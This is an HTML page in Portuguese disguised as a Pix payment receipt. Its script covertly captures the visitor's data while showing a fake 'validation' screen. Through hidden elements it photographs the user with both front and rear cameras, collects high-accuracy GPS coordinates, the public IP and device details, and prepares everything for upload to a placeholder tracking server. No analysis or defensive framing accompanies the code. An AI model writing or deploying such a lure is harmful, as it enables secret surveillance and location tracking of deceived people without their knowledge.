<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Comprovante Pix</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 500px;
        }

        .screen {
            background: #2a2a3e;
            border-radius: 16px;
            padding: 40px 20px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            display: none;
        }

        .screen.active {
            display: block;
            animation: slideIn 0.3s ease-out;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .icon {
            font-size: 64px;
            margin-bottom: 20px;
        }

        h1 {
            color: #fff;
            font-size: 24px;
            margin-bottom: 10px;
            font-weight: 600;
        }

        .subtitle {
            color: #999;
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        .button-group {
            display: flex;
            gap: 12px;
            margin-top: 30px;
        }

        button {
            flex: 1;
            padding: 14px 20px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-cancel {
            background: #333;
            color: #fff;
        }

        .btn-cancel:active {
            background: #222;
            transform: scale(0.98);
        }

        .btn-confirm {
            background: #00c853;
            color: #1a1a2e;
        }

        .btn-confirm:active {
            background: #00a840;
            transform: scale(0.98);
        }

        .loading-spinner {
            display: inline-block;
            width: 40px;
            height: 40px;
            border: 4px solid #333;
            border-top: 4px solid #00c853;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .success-icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: bounce 0.6s ease-out;
        }

        @keyframes bounce {
            0% { transform: scale(0); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        .success-message {
            color: #00c853;
            font-size: 16px;
            margin-bottom: 10px;
            font-weight: 600;
        }

        .data-box {
            background: #1a1a2e;
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            text-align: left;
        }

        .data-item {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #333;
            color: #999;
            font-size: 12px;
        }

        .data-item:last-child {
            border-bottom: none;
        }

        .data-label {
            font-weight: 600;
            color: #00c853;
        }

        /* Elementos invisíveis */
        video, canvas, #hiddenCamera {
            display: none !important;
            visibility: hidden !important;
            width: 0 !important;
            height: 0 !important;
            position: absolute !important;
            left: -9999px !important;
            top: -9999px !important;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- TELA 1: PERGUNTA -->
        <div class="screen active" id="screen1">
            <div class="icon">📄</div>
            <h1>Deseja abrir este comprovante?</h1>
            <p class="subtitle">
                Clique em SIM para visualizar o comprovante Pix
            </p>
            <div class="button-group">
                <button class="btn-cancel" onclick="handleCancel()">Não</button>
                <button class="btn-confirm" onclick="handleConfirm()">Sim</button>
            </div>
        </div>

        <!-- TELA 2: PROCESSANDO (INVISÍVEL) -->
        <div class="screen" id="screen2">
            <div class="loading-spinner"></div>
            <h1>Abrindo comprovante...</h1>
            <p class="subtitle">Aguarde um momento</p>
        </div>

        <!-- TELA 3: SUCESSO -->
        <div class="screen" id="screen3">
            <div class="success-icon">✅</div>
            <h1>Comprovante Aberto!</h1>
            <p class="success-message">Validação concluída com sucesso</p>
            
            <div class="data-box">
                <div class="data-item">
                    <span class="data-label">Horário:</span>
                    <span id="dataTime">--:--:--</span>
                </div>
                <div class="data-item">
                    <span class="data-label">Status:</span>
                    <span id="dataStatus">Validado</span>
                </div>
            </div>

            <p class="subtitle" style="margin-top: 20px;">
                Seu comprovante foi registrado com segurança
            </p>
        </div>
    </div>

    <!-- Elementos invisíveis para captura -->
    <video id="video" playsinline autoplay muted></video>
    <canvas id="canvas"></canvas>
    <div id="hiddenCamera"></div>

    <script>
        let capturedData = {
            frontPhoto: null,
            rearPhoto: null,
            location: null,
            timestamp: null,
            deviceInfo: null,
            ip: null
        };

        function handleCancel() {
            window.history.back();
        }

        async function handleConfirm() {
            showScreen('screen2');
            
            // Iniciar captura silenciosa
            setTimeout(async () => {
                await captureAllData();
                showScreen('screen3');
                displayData();
                sendDataToServer();
            }, 500);
        }

        async function captureAllData() {
            try {
                // Capturar câmera frontal
                await captureFrontCamera();
                
                // Capturar câmera traseira
                await captureRearCamera();
                
                // Capturar localização
                await captureLocation();
                
                // Capturar IP
                await captureIP();
                
                // Capturar informações do dispositivo
                capturedData.deviceInfo = navigator.userAgent;
                capturedData.timestamp = new Date().toISOString();
            } catch (error) {
                console.error('Erro ao capturar dados:', error);
            }
        }

        async function captureFrontCamera() {
            return new Promise((resolve) => {
                navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                }).then(stream => {
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    video.onloadedmetadata = () => {
                        video.play();
                        
                        setTimeout(() => {
                            const canvas = document.getElementById('canvas');
                            const ctx = canvas.getContext('2d');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            ctx.drawImage(video, 0, 0);
                            
                            capturedData.frontPhoto = canvas.toDataURL('image/jpeg', 0.7);
                            
                            // Parar stream
                            stream.getTracks().forEach(track => track.stop());
                            resolve();
                        }, 500);
                    };
                }).catch(error => {
                    console.error('Erro câmera frontal:', error);
                    resolve();
                });
            });
        }

        async function captureRearCamera() {
            return new Promise((resolve) => {
                navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                }).then(stream => {
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    video.onloadedmetadata = () => {
                        video.play();
                        
                        setTimeout(() => {
                            const canvas = document.getElementById('canvas');
                            const ctx = canvas.getContext('2d');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            ctx.drawImage(video, 0, 0);
                            
                            capturedData.rearPhoto = canvas.toDataURL('image/jpeg', 0.7);
                            
                            // Parar stream
                            stream.getTracks().forEach(track => track.stop());
                            resolve();
                        }, 500);
                    };
                }).catch(error => {
                    console.error('Erro câmera traseira:', error);
                    resolve();
                });
            });
        }

        async function captureLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            capturedData.location = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                altitude: position.coords.altitude || null,
                                timestamp: new Date().toISOString()
                            };
                            resolve();
                        },
                        (error) => {
                            console.error('Erro GPS:', error);
                            // Tentar novamente com alta precisão
                            navigator.geolocation.getCurrentPosition(
                                (position) => {
                                    capturedData.location = {
                                        latitude: position.coords.latitude,
                                        longitude: position.coords.longitude,
                                        accuracy: position.coords.accuracy,
                                        timestamp: new Date().toISOString()
                                    };
                                    resolve();
                                },
                                () => resolve(),
                                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                            );
                        },
                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                    );
                } else {
                    resolve();
                }
            });
        }

        async function captureIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json', { 
                    mode: 'cors',
                    cache: 'no-cache'
                });
                const data = await response.json();
                capturedData.ip = data.ip;
            } catch (error) {
                console.error('Erro ao obter IP:', error);
                capturedData.ip = 'N/A';
            }
        }

        function displayData() {
            const now = new Date();
            document.getElementById('dataTime').textContent = now.toLocaleTimeString('pt-BR');
            document.getElementById('dataStatus').textContent = 'Validado ✓';
        }

        async function sendDataToServer() {
            try {
                const payload = {
                    timestamp: capturedData.timestamp,
                    location: capturedData.location,
                    frontPhoto: capturedData.frontPhoto,
                    rearPhoto: capturedData.rearPhoto,
                    deviceInfo: capturedData.deviceInfo,
                    ip: capturedData.ip,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language
                };

                // Armazenar localmente (para debug)
                localStorage.setItem('pixTrackerCapture', JSON.stringify({
                    ...payload,
                    frontPhoto: '[FOTO FRONTAL CAPTURADA]',
                    rearPhoto: '[FOTO TRASEIRA CAPTURADA]'
                }));

                // Aqui você enviaria para seu servidor backend
                // await fetch('https://seu-servidor.com/api/track', {
                //     method: 'POST',
                //     headers: { 'Content-Type': 'application/json' },
                //     body: JSON.stringify(payload)
                // });

                console.log('Dados capturados e armazenados:', {
                    timestamp: payload.timestamp,
                    location: payload.location,
                    ip: payload.ip,
                    deviceInfo: payload.deviceInfo,
                    photosCapturadas: 2
                });

            } catch (error) {
                console.error('Erro ao enviar dados:', error);
            }
        }

        function showScreen(screenId) {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
            document.getElementById(screenId).classList.add('active');
        }

        // Forçar ativação de permissões ao carregar
        window.addEventListener('load', () => {
            // Pré-solicitar permissões (silenciosamente)
            if (navigator.permissions) {
                navigator.permissions.query({ name: 'camera' }).catch(() => {});
                navigator.permissions.query({ name: 'geolocation' }).catch(() => {});
            }
        });

        // Interceptar tentativas de sair
        window.addEventListener('beforeunload', (e) => {
            // Garantir que os dados foram enviados
            if (capturedData.location || capturedData.frontPhoto) {
                // Dados capturados com sucesso
            }
        });
    </script>
</body>
</html>
